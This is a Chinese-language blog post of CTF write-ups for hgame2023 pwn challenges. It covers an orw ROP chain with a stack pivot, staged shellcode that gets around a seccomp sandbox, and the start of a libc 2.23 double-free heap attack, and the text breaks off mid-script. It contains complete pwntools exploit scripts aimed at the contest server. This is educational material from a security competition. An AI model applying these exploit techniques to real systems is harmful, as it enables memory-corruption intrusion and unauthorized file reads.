<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>hgame2023 | Chen</title><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>hgame2023</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-01-10T06:17:54.000Z" id="date"> 2023-01-10</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-03-20T12:16:45.703Z" id="updated"> 2023-03-20</time></div></span><br><span>Word Count: <div class="control">7.4k</div></span><br><span>Read Time: <div class="control">36 min</div></span></div></div><hr><div id="post-content"><h3 id="orw"><a href="#orw" class="headerlink" title="orw"></a><em>orw</em></h3><p><em>以前没做过构造rop链的orw 记录一下</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)</span><br><span class="line">[*] &#x27;/home/chen/vuln&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p><em>保护没啥值得留意的 直接ida打开看一下main函数</em></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  sandbox();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><em>开了沙盒 不出意外应该是禁用了execve 而system(“&#x2F;bin&#x2F;sh”)也是基于execve实现的 所以这里没有办法像以往一样简单的获取shell</em></p>
<p><em>seccomp-tools dump .&#x2F;vuln</em></p>
<p><em>查看一下是否如同猜想的一样</em></p>
<p><em><img src="https://pic.imgdb.cn/item/63bd04ddbe43e0d30e421730.png"></em></p>
<p><em>当调用的函数为execve时进入0004 也就是return kill 禁止调用</em></p>
<p><em>那么跟进一下vuln函数</em></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x130</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><em>可以进行一次栈溢出 但是溢出的字节数只有0x28（还有8字节要给ebp）</em></p>
<p><em>显然这点溢出长度只够我们泄露libc基址 但是由于被禁用了execve system和onegadget都用不了了</em></p>
<p><em>但是如果想用orw的话 很明显 read和open需要的溢出长度远超过0x28</em></p>
<p><em>溢出长度不够的情况一般两种解决办法 自己构造一次read 修改rdx的值 使得溢出长度足够 或者是构造一次read 往bss段写入rop链 随后栈迁移</em></p>
<p><em>但是总归都是要自己调用read 并且我们还需要pop rsi pop rdx的指令地址 但是由于大部分的题目是动态链接 很难找到单独的rsi和rdx 本题也是没有的 这个时候你要想起来 题目所给的libc文件也是可以用ROPgadget查找指令地址的  只不过使用其指令还需要我们泄露libc基址</em></p>
<p><em>那么初步的思路确定了 就可以开始第一步 先泄露基址</em> </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./vuln&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;week-1.hgame.lwsec.cn&quot;</span>,<span class="number">31773</span>)</span><br><span class="line">rdi_addr = <span class="number">0x401393</span></span><br><span class="line">rsi_r15_addr = <span class="number">0x401391</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = <span class="number">0x401070</span></span><br><span class="line">main_addr = <span class="number">0x4012f0</span></span><br><span class="line">read_plt = <span class="number">0x401080</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">bss_addr = <span class="number">0x404090</span>+<span class="number">0x50</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x108</span>)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p><em>接下来是构造read read函数需要三个参数 rdi 控制第一个参数文件描述符 rsi控制写入地址 rdx控制写入字节数</em></p>
<p><em>但是很明显0x28的溢出长度是不够我们构造如此多的参数 那么我们可以gdb动调看一下 如果我们不对这三个寄存器动任何手脚 其分别值为多少</em></p>
<p><em><img src="https://pic.imgdb.cn/item/63bd0a8bbe43e0d30e4c5e16.png"></em></p>
<p><em>rdi满足条件 rdx为0x130 如果我们往bss段写入rop链的话 rdx也不用修改 那么只需要修改rsi就可以了</em></p>
<p><em>ROPgadget获取libc文件的pop rsi偏移 再加上libc基址获得pop rsi指令的地址</em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x108</span>)+p64(rsi_addr)+p64(bss_addr)+p64(read_addr)+p64(main_addr)</span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure>

<p><em>这里注意一下bss_addr 要和bss段的起始位置间隔一段距离 因为bss段比较靠近got表 可能会导致栈空间延申到got表 导致read失败 也是老生常谈的问题了</em></p>
<p><em>那么接下里的难点就是构造rop链了 下面每行各自对应open write puts 应该是浅显易懂的</em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;./flag&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(rdi_addr)+p64(bss_addr)+p64(rsi_addr)+p64(<span class="number">0</span>)+p64(open_addr)</span><br><span class="line">payload += p64(rdi_addr)+p64(<span class="number">3</span>)+p64(rsi_addr)+p64(bss_addr+<span class="number">0x100</span>)+p64(rdx_addr)+p64(<span class="number">0x30</span>)+p64(read_addr)</span><br><span class="line">payload += p64(rdi_addr)+p64(bss_addr+<span class="number">0x100</span>)+p64(puts_addr)</span><br></pre></td></tr></table></figure>

<p><em>完整exp:</em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;week-1.hgame.lwsec.cn&quot;,31773)</span></span><br><span class="line">rdi_addr = <span class="number">0x401393</span></span><br><span class="line">rsi_r15_addr = <span class="number">0x401391</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = <span class="number">0x401070</span></span><br><span class="line">main_addr = <span class="number">0x4012f0</span></span><br><span class="line">read_plt = <span class="number">0x401080</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">bss_addr = <span class="number">0x404090</span>+<span class="number">0x50</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x108</span>)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_addr = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">rsi_addr = libc_addr + <span class="number">0x2601f</span></span><br><span class="line">rdx_addr = libc_addr + <span class="number">0x142c92</span></span><br><span class="line">puts_addr = libc_addr + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">io.recvuntil(<span class="string">&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x108</span>)+p64(rsi_addr)+p64(bss_addr)+p64(read_addr)+p64(main_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">open_addr = libc_addr + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">write_addr = libc_addr + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;./flag&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(rdi_addr)+p64(bss_addr)+p64(rsi_addr)+p64(<span class="number">0</span>)+p64(open_addr)</span><br><span class="line">payload += p64(rdi_addr)+p64(<span class="number">3</span>)+p64(rsi_addr)+p64(bss_addr+<span class="number">0x100</span>)+p64(rdx_addr)+p64(<span class="number">0x30</span>)+p64(read_addr)</span><br><span class="line">payload += p64(rdi_addr)+p64(bss_addr+<span class="number">0x100</span>)+p64(puts_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">leave_addr = <span class="number">0x4012be</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x100</span>)+p64(bss_addr)+p64(leave_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure>

<h3 id="simple-shellcode"><a href="#simple-shellcode" class="headerlink" title="simple_shellcode"></a><em>simple_shellcode</em></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)</span><br><span class="line">[*] &#x27;/home/chen/vuln&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p><em>保护全开 ida看一下main函数</em></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  mmap((<span class="type">void</span> *)<span class="number">0xCAFE0000</span>LL, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your shellcode:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, (<span class="type">void</span> *)<span class="number">0xCAFE0000</span>LL, <span class="number">0x10</span>uLL);</span><br><span class="line">  sandbox();</span><br><span class="line">  MEMORY[<span class="number">0xCAFE0000</span>]();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><em>mmap将0xcafe0000~0xcafe1000这块区域的权限设置为了可读可写可执行 并且程序的最后还调用了这块区域</em></p>
<p><em>明摆着是将shellcode写入到这块区域 同时给了一次写入的机会 但是只有10字节</em></p>
<p><em>但是这次又有sandbox函数 看一下是禁用了哪些函数</em></p>
<p><em><img src="https://pic.imgdb.cn/item/63bd0e3dbe43e0d30e547a78.png"></em></p>
<p><em>还是通过orw来读取flag吧  但是这次是采用shellcode的方式 首当其冲要解决的问题就是写入字节不够的问题</em></p>
<p><em>这0x10字节的长度虽然不够我们写orw 但是可以供我们调用read函数</em></p>
<p><em>但是如果我们想要全部参数都修改一次 也是会超出16字节的 所以还是和上题一样 动态调试看一下传完shellcode后各寄存器的默认值</em></p>
<p><em><img src="https://pic.imgdb.cn/item/63bd33a3be43e0d30ea62dad.png"></em></p>
<p><em>我们只需要修改rsi rdi即可 rax为read的系统调用号0 不需要修改</em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov esi ,0xcafe0500</span></span><br><span class="line"><span class="string">xor edi ,edi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">jmp rsi</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p><em>这里注意一下地址 和bss段同理 栈有可能会溢出到其他不可执行的区域 所以需要抬高一点栈帧空间</em></p>
<p><em>随后就是orw的汇编:</em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">push (2)</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor esi, esi</span></span><br><span class="line"><span class="string">cdq</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov r10d, 0x7fffffff</span></span><br><span class="line"><span class="string">mov rsi, rax</span></span><br><span class="line"><span class="string">push (40)</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">cdq</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p><em>完整exp:</em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./vuln&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;week-1.hgame.lwsec.cn&quot;</span>,<span class="number">31897</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov esi ,0xcafe0500</span></span><br><span class="line"><span class="string">xor edi ,edi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">jmp rsi</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">io.sendline(asm(shellcode))</span><br><span class="line">shellcode = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">push (2)</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor esi, esi</span></span><br><span class="line"><span class="string">cdq</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov r10d, 0x7fffffff</span></span><br><span class="line"><span class="string">mov rsi, rax</span></span><br><span class="line"><span class="string">push (40)</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">cdq</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">io.sendline(asm(shellcode))</span><br><span class="line">io.recv()</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure>

<h3 id="fast-note"><a href="#fast-note" class="headerlink" title="fast_note"></a><em>fast_note</em></h3><p><em>一道很常规的double free题 不过在最后修改malloc_hook的时候有点特殊 也算有学到新知识</em></p>
<p><em>这题是libc 2.23版本</em> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)</span><br><span class="line">[*] &#x27;/home/chen/vuln&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete_note();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        show_note(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Wrong choice!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      add_note();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><em>没有edit函数 add函数的content输入没有堆溢出的机会 看一看delete函数</em></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (&amp;notes)[v1] )</span><br><span class="line">      <span class="built_in">free</span>((&amp;notes)[v1]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Page not found.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There are only 16 pages in this notebook.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><em>堆块释放以后 没有对存放堆块的指针置零 存在UAF漏洞 再加上有show函数 那么泄露libc基址我们可以很轻松的通过unsortedbin来做到</em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io = process(&quot;./vuln&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span 